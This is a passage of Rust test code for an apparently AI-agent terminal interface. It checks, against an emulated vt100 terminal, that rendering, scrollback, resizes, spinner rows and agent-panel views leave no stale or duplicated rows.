            assert_eq!(area.height, content.max(height - area.top()));
            let held = app
                .transcript
                .live_lines(usize::from(area.width), &app.theme);
            // Only a reply's live last row can stay held once the chrome alone fills the screen.
            let chrome = view::chrome(app, area.width, height);
            assert!(
                held.len() + chrome <= usize::from(height) || chrome >= usize::from(height),
                "{} held + {chrome} chrome",
                held.len()
            );
        };
        for i in 0..4 {
            app.transcript.notice(format!("note{i}"));
            expected.push(format!("· note{i}"));
            step(screen, &mut app);
        }
        app.on_event(SessionEvent::AssistantDelta("abcdefghij".repeat(3)));
        step(screen, &mut app);
        for _ in 0..3 {
            app.on_event(SessionEvent::AssistantDelta("klmnopqrst".into()));
            step(screen, &mut app);
        }
        let (tx, _rx) = oneshot::channel();
        app.begin_approval(approval_request("ls"), tx);
        step(screen, &mut app);
        app.approval = None;
        step(screen, &mut app);
        app.input.insert_str("a\nb\nc\nd\ne");
        step(screen, &mut app);
        app.input.take();
        step(screen, &mut app);
        for i in 0..14 {
            app.transcript.notice(format!("later{i}"));
            expected.push(format!("· later{i}"));
            step(screen, &mut app);
        }
        expected
    }

    /// A terminal emulator behind the real crossterm backend, so a test sees what a terminal does
    /// with the bytes ratatui writes rather than what ratatui believes it wrote.
    mod emulated {
        use super::*;
        use std::sync::{Arc, Mutex};

        fn nz(n: u16) -> std::num::NonZeroU16 {
            std::num::NonZeroU16::new(n).expect("the emulator needs at least one row and column")
        }

        type Emulator = Arc<Mutex<vt100::Parser>>;

        /// Set when the screen is erased from its top-left corner, which tmux answers by moving
        /// everything visible into its scrollback.
        type Erased = Arc<std::sync::atomic::AtomicBool>;

        /// When set, the screen as it looks after each escape sequence of every write.
        type Trace = Arc<Mutex<Option<Vec<Vec<String>>>>>;

        /// What reached the writer, one entry per `write` call.
        type Writes = Arc<Mutex<Vec<Vec<u8>>>>;

        struct Sink(Emulator, Erased, Trace);

        impl Sink {
            fn feed(&self, parser: &mut vt100::Parser, bytes: &[u8]) {
                parser.process(bytes);
                if let Some(trace) = self.2.lock().unwrap().as_mut() {
                    let screen = parser.screen();
                    trace.push(
                        screen
                            .rows(0, screen.size().1.get())
                            .map(|r| r.trim_end().to_string())
                            .collect(),
                    );
                }
            }

            /// Feeds `bytes` as the pieces a slow terminal could paint between: each escape
            /// sequence starts a piece.
            fn feed_pieces(&self, parser: &mut vt100::Parser, bytes: &[u8]) {
                if self.2.lock().unwrap().is_none() {
                    parser.process(bytes);
                    return;
                }
                let starts: Vec<usize> = (0..bytes.len()).filter(|&i| bytes[i] == 0x1b).collect();
                let mut from = 0;
                for at in starts.into_iter().filter(|&at| at > 0) {
                    self.feed(parser, &bytes[from..at]);
                    from = at;
                }
                self.feed(parser, &bytes[from..]);
            }
        }

        /// Records each write before passing it on, above `Sink`, which splits what it is given.
        struct Counted(Sink, Writes);

        impl Write for Counted {
            fn write(&mut self, bytes: &[u8]) -> io::Result<usize> {
                self.1.lock().unwrap().push(bytes.to_vec());
                self.0.write(bytes)
            }

            fn flush(&mut self) -> io::Result<()> {
                self.0.flush()
            }
        }

        impl Write for Sink {
            fn write(&mut self, bytes: &[u8]) -> io::Result<usize> {
                let mut parser = self.0.lock().unwrap();
                let mut rest = bytes;
                // tmux moves the visible rows into its history on a whole-screen erase too, which
                // only a scrollback erase in the same frame undoes.
                if let Some(at) = rest.windows(4).position(|w| w == b"\x1b[2J")
                    && !rest[at..].windows(4).any(|w| w == b"\x1b[3J")
                {
                    self.1.store(true, std::sync::atomic::Ordering::Relaxed);
                }
                while let Some(at) = rest.windows(3).position(|w| w == b"\x1b[J") {
                    self.feed_pieces(&mut parser, &rest[..at]);
                    if parser.screen().cursor_position() == (0, 0) {
                        self.1.store(true, std::sync::atomic::Ordering::Relaxed);
                    }
                    self.feed_pieces(&mut parser, b"\x1b[J");
                    rest = &rest[at + 3..];
                }
                self.feed_pieces(&mut parser, rest);
                Ok(bytes.len())
            }

            fn flush(&mut self) -> io::Result<()> {
                Ok(())
            }
        }

        /// Answers every query from the emulator instead of a tty.
        pub struct Emu {
            inner: CrosstermBackend<FrameWriter<Counted>>,
            emulator: Emulator,
        }

        impl Emu {
            fn with(emulator: Emulator, erased: Erased, trace: Trace, writes: Writes) -> Self {
                let sink = Counted(Sink(emulator.clone(), erased, trace), writes);
                Emu::over(emulator, FrameWriter::new(sink))
            }

            fn over(emulator: Emulator, writer: FrameWriter<Counted>) -> Self {
                Emu {
                    inner: CrosstermBackend::new(writer),
                    emulator,
                }
            }
        }

        impl Framed for Emu {
            fn begin_frame(&mut self) {
                self.inner.begin_frame();
            }

            fn end_frame(&mut self) -> io::Result<()> {
                self.inner.end_frame()
            }

            fn purge(&mut self) -> io::Result<()> {
                self.inner.purge()
            }
        }

        impl Backend for Emu {
            type Error = io::Error;

            fn draw<'a, I>(&mut self, content: I) -> io::Result<()>
            where
                I: Iterator<Item = (u16, u16, &'a Cell)>,
            {
                self.inner.draw(content)
            }

            fn append_lines(&mut self, n: u16) -> io::Result<()> {
                self.inner.append_lines(n)
            }

            fn hide_cursor(&mut self) -> io::Result<()> {
                self.inner.hide_cursor()
            }

            fn show_cursor(&mut self) -> io::Result<()> {
                self.inner.show_cursor()
            }

            fn get_cursor_position(&mut self) -> io::Result<Position> {
                let (row, col) = self.emulator.lock().unwrap().screen().cursor_position();
                Ok(Position::new(col, row))
            }

            fn set_cursor_position<P: Into<Position>>(&mut self, position: P) -> io::Result<()> {
                self.inner.set_cursor_position(position)
            }

            fn clear(&mut self) -> io::Result<()> {
                self.inner.clear()
            }

            fn clear_region(&mut self, clear_type: ClearType) -> io::Result<()> {
                self.inner.clear_region(clear_type)
            }

            fn size(&self) -> io::Result<Size> {
                let (rows, cols) = self.emulator.lock().unwrap().screen().size();
                Ok(Size::new(cols.get(), rows.get()))
            }

            fn window_size(&mut self) -> io::Result<WindowSize> {
                let size = self.size()?;
                Ok(WindowSize {
                    columns_rows: size,
                    pixels: Size::new(0, 0),
                })
            }

            fn flush(&mut self) -> io::Result<()> {
                Backend::flush(&mut self.inner)
            }

            fn scroll_region_up(
                &mut self,
                region: std::ops::Range<u16>,
                line_count: u16,
            ) -> io::Result<()> {
                self.inner.scroll_region_up(region, line_count)
            }

            fn scroll_region_down(
                &mut self,
                region: std::ops::Range<u16>,
                line_count: u16,
            ) -> io::Result<()> {
                self.inner.scroll_region_down(region, line_count)
            }
        }

        pub type Real = Anchored<Emu>;

        thread_local! {
            /// The writes that reached the stand-ins made on this thread.
            static SPARE_WRITES: Writes = Writes::default();
        }

        /// A stand-in whose writes are discarded, as the real one's are.
        fn spare() -> Real {
            let emulator = Arc::new(Mutex::new(vt100::Parser::new(nz(1), nz(1), 0)));
            let sink = Sink(emulator.clone(), Erased::default(), Trace::default());
            let counted = Counted(sink, SPARE_WRITES.with(Arc::clone));
            Anchored::new(Emu::over(emulator, FrameWriter::discarding(counted)))
        }

        pub struct Harness {
            pub screen: Screen<Real>,
            emulator: Emulator,
            erased: Erased,
            trace: Trace,
            writes: Writes,
            height: u16,
        }

        impl Harness {
            pub fn new(width: u16, height: u16) -> Self {
                let emulator =
                    Arc::new(Mutex::new(vt100::Parser::new(nz(height), nz(width), 1000)));
                let erased = Erased::default();
                let trace = Trace::default();
                let writes = Writes::default();
                let backend = Anchored::new(Emu::with(
                    emulator.clone(),
                    erased.clone(),
                    trace.clone(),
                    writes.clone(),
                ));
                SPARE_WRITES.with(|w| w.lock().unwrap().clear());
                Harness {
                    screen: Screen::new(backend, spare).unwrap(),
                    emulator,
                    erased,
                    trace,
                    writes,
                    height,
                }
            }

            pub fn height(&self) -> u16 {
                self.height
            }

            /// Resizes the emulated terminal, as a window or pane resize does.
            pub fn resize(&mut self, width: u16, height: u16) {
                self.emulator
                    .lock()
                    .unwrap()
                    .set_size(nz(height), nz(width));
                self.height = height;
            }

            /// Renders once and returns what reached the writer, one entry per `write` call.
            pub fn writes_of(&mut self, app: &mut App) -> Vec<Vec<u8>> {
                self.writes.lock().unwrap().clear();
                self.screen.render(app).unwrap();
                mem::take(&mut *self.writes.lock().unwrap())
            }

            /// Writes that reached the stand-ins made by this thread's harnesses.
            pub fn spare_writes(&self) -> usize {
                SPARE_WRITES.with(|w| w.lock().unwrap().len())
            }

            /// Renders once, returning the screen before the frame, after it, and after each
            /// escape sequence of it.
            pub fn pieces_of(&mut self, app: &mut App) -> (Vec<String>, Vec<Vec<String>>) {
                let before = self.real();
                *self.trace.lock().unwrap() = Some(Vec::new());
                self.screen.render(app).unwrap();
                let pieces = self.trace.lock().unwrap().take().unwrap();
                (before, pieces)
            }

            /// The emulator's visible rows, trailing blanks trimmed.
            pub fn real(&self) -> Vec<String> {
                let parser = self.emulator.lock().unwrap();
                let screen = parser.screen();
                screen
                    .rows(0, screen.size().1.get())
                    .map(|r| r.trim_end().to_string())
                    .collect()
            }

            /// Every row that has left the visible screen, oldest first, trailing blanks trimmed.
            pub fn scrollback(&self) -> Vec<String> {
                let mut parser = self.emulator.lock().unwrap();
                let rows = usize::from(self.height);
                let mut out = Vec::new();
                let mut offset = 0;
                loop {
                    offset += rows;
                    parser.screen_mut().set_scrollback(offset);
                    let reached = parser.screen().scrollback();
                    let screen = parser.screen();
                    let page: Vec<String> = screen
                        .rows(0, screen.size().1.get())
                        .map(|r| r.trim_end().to_string())
                        .collect();
                    let new = reached.saturating_sub(offset - rows);
                    out.splice(0..0, page[..new.min(rows)].to_vec());
                    if reached < offset {
                        break;
                    }
                }
                parser.screen_mut().set_scrollback(0);
                out
            }

            /// Writes `text` over a row as a stale live row, leaving ratatui unaware of it.
            pub fn paint(&mut self, row: u16, text: &str) {
                let bytes = format!("\x1b7\x1b[{};1H\x1b[2K{text}\x1b8", row + 1);
                self.emulator.lock().unwrap().process(bytes.as_bytes());
            }

            pub fn render_unchecked(&mut self, app: &mut App) {
                self.screen.render(app).unwrap();
            }

            /// ratatui's idea of the rows: blank above the viewport, its buffer below.
            fn model(&mut self, app: &App) -> Vec<String> {
                let area = self.screen.area();
                let mut drawn = Terminal::new(TestBackend::new(area.width, area.height)).unwrap();
                drawn.draw(|frame| view::draw(frame, app)).unwrap();
                let mut all = vec![String::new(); usize::from(area.top())];
                all.extend(
                    rows(drawn.backend().buffer())
                        .into_iter()
                        .map(|r| r.trim_end().to_string()),
                );
                all
            }

            /// Renders, then checks the emulator against ratatui's model and the input box's
            /// place above the status row.
            pub fn render(&mut self, app: &mut App, what: &str) {
                self.screen.render(app).unwrap();
                assert!(
                    !self.erased.load(std::sync::atomic::Ordering::Relaxed),
                    "{what}: the screen was erased from its top-left corner"
                );
                let area = self.screen.area();
                let model = self.model(app);
                let real = self.real();
                let top = usize::from(area.top());
                let ctx = || {
                    format!(
                        "{what} ({}x{})\nmodel:\n{}\nreal:\n{}",
                        area.width,
                        self.height,
                        model.join("\n"),
                        real.join("\n")
                    )
                };
                assert_eq!(area.bottom(), self.height, "{}", ctx());
                assert_eq!(real[top..], model[top..], "{}", ctx());
                let h = usize::from(self.height);
                let box_top = &real[h - 4];
                assert!(box_top.contains("message ·"), "{}", ctx());
                assert!(real[h - 3].starts_with('│'), "{}", ctx());
                assert!(
                    real[h - 2].starts_with('└') || real[h - 2].starts_with('╰'),
                    "{}",
                    ctx()
                );
            }
        }
    }

    fn started(app: &mut App, n: usize) {
        app.on_event(SessionEvent::ToolCall {
            id: format!("t{n}"),
            tool: "shell".into(),
            args: serde_json::json!({ "command": format!("sleep {} # a long argument", 20 + n) }),
        });
    }

    fn finished(app: &mut App, n: usize) {
        finished_with(app, n, "done");
    }

    fn finished_with(app: &mut App, n: usize, text: &str) {
        app.on_event(SessionEvent::ToolResult {
            id: format!("t{n}"),
            tool: "shell".into(),
            success: true,
            text: text.into(),
        });
    }

    /// Fills the terminal's history, starts `calls` tool calls (one render each, or in one batch)
    /// and finishes them in order or reversed, checking every frame against the emulator.
    fn live_rows_scenario(width: u16, height: u16, calls: usize, batch: bool, reversed: bool) {
        let mut harness = emulated::Harness::new(width, height);
        let mut app = app();
        for i in 0..usize::from(height) + 4 {
            app.transcript.notice(format!("note {i}"));
            harness.render(&mut app, "filling");
        }
        if batch {
            (0..calls).for_each(|n| started(&mut app, n));
            harness.render(&mut app, "batch start");
        } else {
            for n in 0..calls {
                started(&mut app, n);
                harness.render(&mut app, &format!("start {n}"));
            }
        }
        let mut order: Vec<usize> = (0..calls).collect();
        if reversed {
            order.reverse();
        }
        for n in order {
            finished(&mut app, n);
            harness.render(&mut app, &format!("finish {n}"));
        }
    }

    /// A terminal that ignores the one-row scroll region ratatui uses scrolls the whole screen,
    /// so the row a settled line is drawn over still holds the live row last painted there.
    #[test]
    fn issue_217_settled_lines_keep_no_stale_live_row_text() {
        for height in 6..=12 {
            let mut harness = emulated::Harness::new(60, height);
            let mut app = app();
            for i in 0..usize::from(height) + 4 {
                app.transcript.notice(format!("note {i}"));
                harness.render(&mut app, "filling");
            }
            for n in 0..usize::from(height) {
                started(&mut app, n);
                harness.render(&mut app, &format!("start {n}"));
            }
            // One row per call, so the live area's rows are the ones the stale text is painted on.
            for n in 0..usize::from(height) {
                finished_with(&mut app, n, "");
                harness.render(&mut app, &format!("finish {n}"));
            }
            for row in 0..height - 4 {
                harness.paint(row, &format!("STALE LIVE ROW {row} {}", "x".repeat(30)));
            }
            for i in 0..usize::from(height) {
                app.transcript.notice(format!("short {i}"));
            }
            harness.render_unchecked(&mut app);
            let history = harness.scrollback();
            let stale: Vec<_> = history
                .iter()
                .filter(|r| {
                    let short = r
                        .strip_prefix("· short ")
                        .is_some_and(|n| n.parse::<u8>().is_ok());
                    !(short
                        || r.starts_with("· note ")
                        || (r.starts_with("• shell sleep ")
                            && (r.ends_with(" …") || r.ends_with(" ✓"))))
                })
                .collect();
            assert!(stale.is_empty(), "height {height}: {stale:?}");
        }
    }

    /// What a frame's check observed: whether the live area resized and whether lines were
    /// committed with the viewport at the top of the screen.
    struct Frame {
        resized: bool,
        committed_at_top: bool,
    }

    /// The frames of a session that grows and shrinks the live area while settled lines are
    /// committed with the viewport at the top of the screen: for each, the app, the harness and
    /// what changed.
    fn frames(
        harness: &mut emulated::Harness,
        app: &mut App,
        mut check: impl FnMut(&mut emulated::Harness, &mut App) -> Frame,
    ) -> (usize, usize) {
        let height = usize::from(harness.height());
        let (mut resized, mut committed) = (0, 0);
        let mut count = |frame: Frame| {
            resized += usize::from(frame.resized);
            committed += usize::from(frame.committed_at_top);
        };
        for i in 0..height + 4 {
            app.transcript.notice(format!("note {i}"));
            count(check(harness, app));
        }
        for n in 0..3 {
            started(app, n);
            count(check(harness, app));
        }
        for n in 0..3 {
            finished(app, n);
            count(check(harness, app));
        }
        app.transcript.clear();
        app.transcript.notice(String::from("fresh"));
        count(check(harness, app));
        let (tx, _rx) = oneshot::channel();
        app.begin_approval(approval_request("ls"), tx);
        count(check(harness, app));
        app.approval = None;
        count(check(harness, app));
        for i in 0..3 {
            app.transcript.notice(format!("late {i}"));
            count(check(harness, app));
        }
        (resized, committed)
    }

    /// The change a render made to the live area: its height and whether lines were committed
    /// while the viewport sat in the top two rows.
    fn rendered(
        harness: &mut emulated::Harness,
        render: impl FnOnce(&mut emulated::Harness),
    ) -> Frame {
        let (height, top) = (harness.screen.height, harness.screen.area().y);
        let history = harness.scrollback().len();
        render(harness);
        Frame {
            resized: harness.screen.height != height,
            committed_at_top: top <= 1 && harness.scrollback().len() > history,
        }
    }

    /// A frame that reaches the terminal in several writes is painted in several steps by a
    /// terminal that does not honor the synchronized-update markers.
    #[test]
    fn issue_220_every_frame_is_one_write_wrapped_in_the_sync_markers() {
        let mut harness = emulated::Harness::new(40, 10);
        let mut app = app();
        let (resized, committed) = frames(&mut harness, &mut app, |harness, app| {
            rendered(harness, |harness| {
                let writes = harness.writes_of(app);
                assert_eq!(writes.len(), 1, "{writes:?}");
                let frame = String::from_utf8_lossy(&writes[0]).into_owned();
                assert!(frame.starts_with("\x1b[?2026h"), "{frame:?}");
                assert!(frame.ends_with("\x1b[?2026l"), "{frame:?}");
            })
        });
        assert!(
            resized > 0 && committed > 0,
            "{resized} resized, {committed} committed"
        );
        assert_eq!(harness.spare_writes(), 0);
    }

    /// Whether `now` is `before` with the rows between its first and last difference scrolled
    /// up or down, the rows the scroll exposes left blank.
    fn is_scroll_of(before: &[String], now: &[String]) -> bool {
        let differing: Vec<usize> = (0..now.len()).filter(|&r| now[r] != before[r]).collect();
        let (Some(&first), Some(&last)) = (differing.first(), differing.last()) else {
            return false;
        };
        let region = first..last + 1;
        (1..region.len()).any(|k| {
            let up = region.clone().all(|r| {
                now[r]
                    == before
                        .get(r + k)
                        .filter(|_| r + k < region.end)
                        .map_or("", |s| s)
            });
            let down = region.clone().all(|r| {
                now[r]
                    == r.checked_sub(k)
                        .filter(|&from| from >= region.start)
                        .map_or("", |from| before[from].as_str())
            });
            up || down
        })
    }

    /// A row that holds text before a frame and after it must not go blank in between, or a
    /// terminal that paints what it has read so far flashes. A terminal scroll exposes blank
    /// rows that the same frame fills, which no write order avoids.
    #[test]
    fn issue_220_rows_that_keep_their_text_are_never_blanked_mid_frame() {
        let mut harness = emulated::Harness::new(40, 10);
        let mut app = app();
        let (resized, committed) = frames(&mut harness, &mut app, |harness, app| {
            rendered(harness, |harness| {
                let (before, pieces) = harness.pieces_of(app);
                let after = harness.real();
                let mut previous = &before;
                for (n, piece) in pieces.iter().enumerate() {
                    for row in 0..before.len() {
                        let kept = !before[row].is_empty() && !after[row].is_empty();
                        if kept && piece[row].is_empty() && !previous[row].is_empty() {
                            assert!(
                                is_scroll_of(previous, piece),
                                "row {row} blanked by piece {n} of {}\nbefore:\n{}\nafter:\n{}",
                                pieces.len(),
                                before.join("\n"),
                                after.join("\n")
                            );
                        }
                    }
                    previous = piece;
                }
            })
        });
        assert!(
            resized > 0 && committed > 0,
            "{resized} resized, {committed} committed"
        );
    }

    fn press_key(app: &mut App, code: KeyCode) {
        app.handle_input(crate::Input::Key(KeyEvent::new(code, KeyModifiers::NONE)));
    }

    /// Rows of the live area's chrome that must never reach the terminal's history.
    fn chrome_in_history(harness: &emulated::Harness) -> Vec<String> {
        harness
            .scrollback()
            .into_iter()
            .filter(|r| {
                r.contains("message ·")
                    || r.contains(" commands ")
                    || r.starts_with("Tasks ")
                    || r.contains("Enter run")
                    || r.contains("manual")
                    || r.contains("Working…")
            })
            .collect()
    }

    /// The `/` menu opens, narrows and stays open while tool rows are live and extra notices
    /// are committed under it.
    fn popup_scenario(
        width: u16,
        height: u16,
        todos: bool,
        extra_notices: usize,
        resizes: &[(u16, u16)],
    ) {
        let mut harness = emulated::Harness::new(width, height);
        let mut app = app();
        let what = |s: &str| format!("{s} from {width}x{height} todos={todos}");
        for i in 0..usize::from(height) + 4 {
            app.transcript.notice(format!("note {i}"));
            harness.render(&mut app, &what("filling"));
        }
        app.running = true;
        if todos {
            app.todos.set_items(
                (0..7)
                    .map(|n| fontaine_tools::todo::TodoItem {
                        content: format!("task {n}"),
                        status: fontaine_tools::todo::TodoStatus::Completed,
                    })
                    .collect(),
            );
        }
        started(&mut app, 0);
        harness.render(&mut app, &what("start"));
        finished_with(&mut app, 0, "row a\nrow b\nGATE_DONE\n[exit code 0]");
        harness.render(&mut app, &what("finish"));
        for c in "/guardian-enable".chars() {
            press_key(&mut app, KeyCode::Char(c));
            harness.render(&mut app, &what(&format!("typed {c}")));
            let leaked = chrome_in_history(&harness);
            assert!(leaked.is_empty(), "{}: {leaked:?}", what("typing"));
        }
        for n in 0..extra_notices {
            app.transcript
                .notice("a turn is running; wait for it or press Esc to interrupt");
            harness.render(&mut app, &what(&format!("notice {n}")));
            let leaked = chrome_in_history(&harness);
            assert!(leaked.is_empty(), "{}: {leaked:?}", what("notice"));
        }
        started(&mut app, 1);
        harness.render(&mut app, &what("next call"));
        for &(w, h) in resizes {
            harness.resize(w, h);
            harness.render(&mut app, &what(&format!("resized to {w}x{h}")));
            let leaked = chrome_in_history(&harness);
            assert!(
                leaked.is_empty(),
                "{}: {leaked:?}",
                what(&format!("{w}x{h}"))
            );
            let seen = [harness.scrollback(), harness.real()].concat();
            for n in 0..usize::from(height) + 4 {
                let note = format!("· note {n}");
                let count = seen.iter().filter(|r| **r == note).count();
                assert_eq!(count, 1, "{note} after {w}x{h}: {seen:?}");
            }
        }
        press_key(&mut app, KeyCode::Esc);
        harness.render(&mut app, &what("menu closed"));
        app.input.take();
        harness.render(&mut app, &what("input cleared"));
        finished(&mut app, 1);
        harness.render(&mut app, &what("next call done"));
        let leaked = chrome_in_history(&harness);
        assert!(leaked.is_empty(), "{}: {leaked:?}", what("end"));
    }

    /// A resize used to let ratatui erase the screen from its top-left corner (or the whole
    /// screen, when narrower), which tmux answers by moving every visible row, the live area
    /// included, into its history, where it stayed as a stale copy under the redrawn one.
    #[test]
    fn issue_279_a_resize_leaves_no_copy_of_the_live_area_in_history() {
        for (width, height) in [(80, 30), (119, 30), (59, 12), (40, 10)] {
            for resizes in [
                [(width, height - 4)],
                [(width, height + 4)],
                [(width / 2, height)],
                [(width + 20, height)],
                [(width - 1, height - 2)],
            ] {
                popup_scenario(width, height, true, 2, &resizes);
            }
        }
        popup_scenario(119, 30, true, 2, &[(59, 30), (58, 30), (119, 20)]);
    }

    /// The `/` menu, live tool rows and committed notices at a fixed size, which on its own
    /// does not duplicate the live area: `cargo test -p fontaine-tui -- --ignored issue_279_sweep`.
    #[test]
    #[ignore]
    fn issue_279_sweep() {
        for height in 6..=30 {
            for width in (40..=100).step_by(3) {
                for todos in [false, true] {
                    popup_scenario(width, height, todos, 2, &[]);
                }
            }
        }
    }

    #[test]
    fn the_spinner_row_appearing_and_going_leaves_no_chrome_in_history() {
        for (width, height) in [(80, 24), (59, 12), (119, 30)] {
            let mut harness = emulated::Harness::new(width, height);
            let mut app = app();
            let what = |s: &str| format!("{s} from {width}x{height}");
            for i in 0..usize::from(height) + 4 {
                app.transcript.notice(format!("note {i}"));
                harness.render(&mut app, &what("filling"));
            }
            app.set_running(true);
            started(&mut app, 0);
            for frame in 0..12 {
                app.spinner_frame = frame;
                harness.render(&mut app, &what(&format!("frame {frame}")));
                let leaked = chrome_in_history(&harness);
                assert!(leaked.is_empty(), "{}: {leaked:?}", what("spinning"));
            }
            for (w, h) in [(width - 7, height), (width, height - 4), (width, height)] {
                harness.resize(w, h);
                app.spinner_frame += 1;
                harness.render(&mut app, &what(&format!("resized to {w}x{h}")));
                let leaked = chrome_in_history(&harness);
                assert!(leaked.is_empty(), "{}: {leaked:?}", what("resized"));
            }
            finished_with(&mut app, 0, "done");
            app.set_running(false);
            harness.render(&mut app, &what("stopped"));
            let leaked = chrome_in_history(&harness);
            assert!(leaked.is_empty(), "{}: {leaked:?}", what("stopped"));
        }
    }

    #[test]
    fn issue_217_live_tool_rows_stay_above_the_prompt_box() {
        for calls in 1..=3 {
            for batch in [false, true] {
                for reversed in [false, true] {
                    live_rows_scenario(40, 10, calls, batch, reversed);
                }
            }
        }
    }

    #[test]
    fn issue_217_strided_matrix() {
        for height in (6..=24).step_by(4) {
            for width in (20..=80).step_by(10) {
                for calls in 1..=3 {
                    live_rows_scenario(width, height, calls, false, false);
                    live_rows_scenario(width, height, calls, true, true);
                }
            }
        }
    }

    /// The full local diagnostic: `cargo test -p fontaine-tui -- --ignored issue_217_full_sweep`.
    #[test]
    #[ignore]
    fn issue_217_full_sweep() {
        for height in 6..=24 {
            for width in 20..=80 {
                for calls in 1..=4 {
                    for batch in [false, true] {
                        for reversed in [false, true] {
                            live_rows_scenario(width, height, calls, batch, reversed);
                        }
                    }
                }
            }
        }
    }

    #[test]
    fn the_live_area_always_ends_on_the_bottom_row() {
        let mut screen = screen(30, 10);
        scripted(&mut screen, 10);
    }

    #[test]
    fn committed_lines_stay_contiguous() {
        let mut screen = screen(30, 10);
        let notices = scripted(&mut screen, 10);
        let mut trimmed = above(&mut screen)
            .iter()
            .map(|r| r.trim_end().to_string())
            .collect::<Vec<_>>();
        let history = nonblank(everything(&screen));
        while trimmed.last().is_some_and(|r| r.is_empty()) {
            trimmed.pop();
        }
        assert!(trimmed.iter().all(|r| !r.is_empty()), "{trimmed:?}");
        let notes: Vec<String> = history
            .into_iter()
            .filter(|r| r.starts_with("· "))
            .collect();
        assert_eq!(notes, notices);
    }

    #[test]
    fn a_taller_terminal_is_filled_on_the_next_render() {
        let mut screen = screen(30, 10);
        let mut app = app();
        screen.render(&mut app).unwrap();
        screen.terminal.backend_mut().resize(30, 16);
        screen.render(&mut app).unwrap();
        assert_eq!(screen.area().bottom(), 16);
    }

    #[test]
    fn an_armed_anchor_answers_one_cursor_query() {
        let mut inner = TestBackend::new(10, 10);
        inner.set_cursor_position(Position::new(3, 4)).unwrap();
        let mut backend = Anchored::new(inner);
        assert_eq!(backend.get_cursor_position().unwrap(), Position::new(3, 4));
        backend.arm(Position::new(0, 7));
        assert_eq!(backend.get_cursor_position().unwrap(), Position::new(0, 7));
        assert_eq!(backend.get_cursor_position().unwrap(), Position::new(3, 4));
    }

    fn panel_row(n: usize) -> crate::agents_panel::PanelRow {
        crate::agents_panel::PanelRow {
            id: format!("agent-{n}"),
            name: format!("worker-{n}"),
            agent_type: "worker".into(),
            model: "m/x".into(),
            status: fontaine_agents::runner::ChildStatus::Done,
            tokens: 10,
            token_budget: None,
            cost_usd: None,
            cost_budget: None,
            cost_partial: false,
            depth: 1,
            writing: 0,
            stopped_because: None,
        }
    }

    /// The reported blank chat: a tall agents panel pushes the transcript into scrollback, and
    /// closing it used to leave the last messages above a padded viewport.
    #[test]
    fn issue_296_closing_a_tall_agents_panel_leaves_the_last_message_on_screen() {
        let mut screen = screen(40, 14);
        let mut app = app();
        for i in 0..12 {
            app.transcript.notice(format!("n{i}"));
        }
        screen.render(&mut app).unwrap();
        let mut panel = crate::agents_panel::AgentsPanel::new();
        panel.set_rows((1..=6).map(panel_row).collect());
        app.agents = Some(panel);
        screen.render(&mut app).unwrap();
        assert!(app.committed_under_overlay);
        assert!(
            !nonblank(rows(screen.backend().scrollback())).is_empty(),
            "the panel forced rows into scrollback"
        );
        app.handle_input(crate::Input::Key(KeyEvent::new(
            KeyCode::Esc,
            KeyModifiers::NONE,
        )));
        screen.render(&mut app).unwrap();
        let visible = rows(screen.backend().buffer());
        assert!(
            visible.iter().any(|row| row.contains("n11")),
            "the last message is on the visible rows: {visible:?}"
        );
        let all = nonblank(everything(&screen));
        for i in 0..12 {
            let text = format!("· n{i}");
            let count = all.iter().filter(|row| **row == text).count();
            assert_eq!(count, 1, "{text}: {all:?}");
        }
    }

    #[test]
    fn closing_a_panel_that_committed_nothing_keeps_the_screen() {
        let mut screen = screen(40, 14);
        let mut app = app();
        app.transcript.notice("only");
        screen.render(&mut app).unwrap();
        app.agents = Some(crate::agents_panel::AgentsPanel::new());
        screen.render(&mut app).unwrap();
        app.handle_input(crate::Input::Key(KeyEvent::new(
            KeyCode::Esc,
            KeyModifiers::NONE,
        )));
        assert!(!app.reprint);
    }

    fn contains_in_order(haystack: &[u8], needles: &[&[u8]]) -> bool {
        let mut from = 0;
        for needle in needles {
            match haystack[from..]
                .windows(needle.len())
                .position(|window| window == *needle)
            {
                Some(at) => from += at + needle.len(),
                None => return false,
            }
        }
        true
    }

    #[test]
    fn viewing_an_agent_erases_the_scrollback_and_writes_only_that_transcript() {
        let mut harness = emulated::Harness::new(40, 12);
        let mut app = app();
        for i in 0..20 {
            app.transcript.notice(format!("main {i}"));
            harness.render(&mut app, "filling");
        }
        assert!(harness.scrollback().iter().any(|r| r.contains("main 0")));
        app.view_of("agent-1".into())
            .transcript
            .user("the agent's task".into());
        for i in 0..20 {
            app.view_of("agent-1".into())
                .transcript
                .notice(format!("agent {i}"));
        }
        app.view(Some("agent-1".into()));
        let writes = harness.writes_of(&mut app).concat();
        assert!(
            contains_in_order(&writes, &[b"\x1b[2J", b"\x1b[3J"]),
            "the screen is erased, then the scrollback: {:?}",
            String::from_utf8_lossy(&writes)
        );
        harness.render(&mut app, "after viewing an agent");
        let mut seen = harness.scrollback();
        seen.extend(harness.real());
        assert!(
            seen.iter().any(|r| r.contains("> the agent's task")),
            "{seen:?}"
        );
        assert!(seen.iter().any(|r| r.contains("agent 19")), "{seen:?}");
        assert!(!seen.iter().any(|r| r.contains("main ")), "{seen:?}");
        let task = seen
            .iter()
            .filter(|r| r.contains("the agent's task"))
            .count();
        assert_eq!(task, 1, "{seen:?}");

        // The main conversation moved on while hidden, and comes back whole.
        app.transcript.notice("arrived while hidden");
        app.view(None);
        let writes = harness.writes_of(&mut app).concat();
        assert!(contains_in_order(&writes, &[b"\x1b[2J", b"\x1b[3J"]));
        harness.render(&mut app, "back on main");
        let mut seen = harness.scrollback();
        seen.extend(harness.real());
        for i in 0..20 {
            let text = format!("· main {i}");
            let count = seen.iter().filter(|r| r.trim_end() == text).count();
            assert_eq!(count, 1, "{text}: {seen:?}");
        }
        assert!(seen.iter().any(|r| r.contains("arrived while hidden")));
        assert!(!seen.iter().any(|r| r.contains("agent ")), "{seen:?}");
    }

    #[test]
    fn clear_live_keeps_scrollback_and_blanks_the_live_rows() {
        let mut screen = screen(30, 10);
        let mut app = app();
        for i in 0..12 {
            app.transcript.notice(format!("n{i}"));
        }
        screen.render(&mut app).unwrap();
        screen.commit_all(&mut app).unwrap();
        let before = rows(screen.backend().scrollback());
        screen.clear_live().unwrap();
        assert_eq!(rows(screen.backend().scrollback()), before);
        assert!(nonblank(live(&mut screen)).is_empty());
        let expected: Vec<String> = (0..12).map(|i| format!("· n{i}")).collect();
        assert_eq!(nonblank(everything(&screen)), expected);
    }

    #[test]
    fn leaving_without_committing_loses_nothing_that_was_committed() {
        let mut screen = screen(30, 10);
        let mut app = app();
        for i in 0..3 {
            app.transcript.notice(format!("n{i}"));
